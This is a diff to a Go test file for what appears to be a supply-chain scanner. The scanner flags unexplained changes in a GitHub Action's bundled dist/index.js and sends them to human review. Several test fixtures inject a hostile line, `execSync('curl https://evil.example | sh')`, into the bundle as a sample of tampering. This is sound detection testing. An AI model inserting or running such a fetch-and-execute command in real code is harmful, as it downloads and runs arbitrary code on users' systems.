@@ -4,9 +4,11 @@ import (
 	"context"
 	"encoding/base64"
 	"encoding/json"
+	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"strings"
 	"testing"
 
@@ -407,6 +409,31 @@ func TestFetchScenarios(t *testing.T) {
 			v2: func(f map[string]string) {
 				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
 			}},
+		// A rebuildable action: a verified rebuild sends the residual to
+		// review, unless a build-only package (in no bundle) changed.
+		{name: "residual a rebuild can clear", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
+			v1: rebuildableLock,
+			v2: func(f map[string]string) {
+				rebuildableLock(f)
+				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
+			},
+			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
+				if len(res.Rebuilds) != 1 || !residualIfRebuilt(res) {
+					t.Errorf("rebuilds %d, residual not marked IfRebuilt: %+v\n%s", len(res.Rebuilds), res.Findings, ev.files["actions/summary.md"].content)
+				}
+			}},
+		{name: "residual with a build-only package change", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
+			v1: rebuildableLock,
+			v2: func(f map[string]string) {
+				rebuildableLock(f)
+				f["package-lock.json"] = strings.Replace(f["package-lock.json"], `"node_modules/@vercel/ncc":{"version":"0.38.0","resolved":"https://registry.npmjs.org/@vercel/ncc/-/ncc-0.38.0.tgz"`, `"node_modules/@vercel/ncc":{"version":"0.38.1","resolved":"https://registry.npmjs.org/@vercel/ncc/-/ncc-0.38.1.tgz"`, 1)
+				f["dist/index.js"] = strings.Replace(f["dist/index.js"], "  return 0;", "  require('child_process').execSync('curl https://evil.example | sh');\n  return 0;", 1)
+			},
+			check: func(t *testing.T, res fetch.Result, ev *memEvidence) {
+				if len(res.Rebuilds) != 1 || residualIfRebuilt(res) {
+					t.Errorf("rebuilds %d, residual marked IfRebuilt despite a build-only change: %+v", len(res.Rebuilds), res.Findings)
+				}
+			}},
 		{name: "first-party bundle change without source change", want: model.RouteHuman, codes: []string{"actions.dist-residual"},
 			v2: func(f map[string]string) {
 				f["src/main.ts"] = v1Files()["src/main.ts"]
@@ -616,4 +643,25 @@ func TestFetchScenarios(t *testing.T) {
 			runScenario(t, sc)
 		})
 	}
+}
+
+var lockEntryRe = regexp.MustCompile(`"node_modules/([^"]+)":\{"version":"([^"]+)"\}`)
+
+// rebuildableLock gives every locked package a registry tarball and
+// sha512 integrity, so the rebuild job can rebuild the action.
+func rebuildableLock(f map[string]string) {
+	f["package-lock.json"] = lockEntryRe.ReplaceAllStringFunc(f["package-lock.json"], func(m string) string {
+		g := lockEntryRe.FindStringSubmatch(m)
+		base := g[1][strings.LastIndex(g[1], "/")+1:]
+		return fmt.Sprintf(`"node_modules/%s":{"version":"%s","resolved":"https://registry.npmjs.org/%s/-/%s-%s.tgz","integrity":"sha512-AAAA"}`, g[1], g[2], g[1], base, g[2])
+	})
+}
+
+func residualIfRebuilt(res fetch.Result) bool {
+	for _, f := range res.Findings {
+		if f.Code == "actions.dist-residual" {
+			return f.IfRebuilt
+		}
+	}
+	return false
 }
